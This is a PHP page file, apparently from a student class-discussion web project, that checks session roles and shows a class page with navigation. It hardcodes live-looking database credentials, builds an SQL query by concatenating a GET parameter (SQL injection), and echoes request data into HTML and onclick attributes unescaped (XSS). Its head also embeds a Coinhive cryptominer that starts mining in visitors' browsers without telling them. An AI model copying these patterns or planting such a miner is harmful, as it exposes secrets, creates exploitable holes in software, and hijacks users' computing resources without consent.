<?php
  session_start();
  //Check if user is logged in
  if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
    if($_SESSION['role'] != 4) {
      $_SESSION['error'] = true;
      $_SESSION['errorCode'] = "Not Permitted";
      header("Location: ../login.php");
      die("oops");
    }
  } else {
    $_SESSION['error'] = true;
    $_SESSION['errorCode'] = "Session Expired";
    header("Location: ../login.php");
  }

  //TODO Grab all this from a file
  //Define sql database information
  $host="mysql.cs.iastate.edu";
  $port=3306;
  $socket="";
  $user="dbu309sab3";
  $password="SD0wFGqd";
  $dbname="db309sab3";
  //Connect to database
  $db = new mysqli($host, $user, $password, $dbname, $port, $socket) or die ('Could not connect to the database server' . mysqli_connect_error());

  //Get this class
  $query = "SELECT * FROM classes WHERE ID = " . $_GET['class'];
  $result = $db->query($query) or die($db->error);
  $class = $result->fetch_assoc()

?>

<html lang="en">
  <head>
    <link rel="stylesheet" href="../css/pages.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <link rel="stylesheet" href="css/home.css">
    <script>
	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
	      miner.start();
    </script>
    <!-- End questionable content -->
    <!-- The top banner of the webpage -->
    <div class="top">
        <font size="-5"><a class="logout" href="../login.php?event=logout">Logout</a></font>
        <center>
          <?php
            echo '<h1>' . $class['class_name'] . '</h1>';
          ?>
        </center>
    </div>
  </head>

  <!-- The left sidebar -->
  <div class="left">
    <?php
      echo '<button class="button" onclick="window.location=\'home.php\';">' . $_SESSION['name'] . '\'s Home</button>';
      echo '<button class="button" onclick="window.location=\'pages.php?class=' . $_GET['class'] . '\';">' . $class['class_name'] . ' Home</button>';
      echo '<button class="button" onclick="window.location=\'topics.php?class=' . $_GET['class'] . '\';">Discussion Topics</button>';
      echo '<button class="button" onclick="window.location=\'liveSession.php?class=' . $_GET['class'] . '\';">Live Session</button>';
     ?>
  </div>

  <!-- Main content of the webpage -->
  <div class="main">
    <div align="center" class="container">
      <?php

      ?>
    </div>
  </div>

</html>
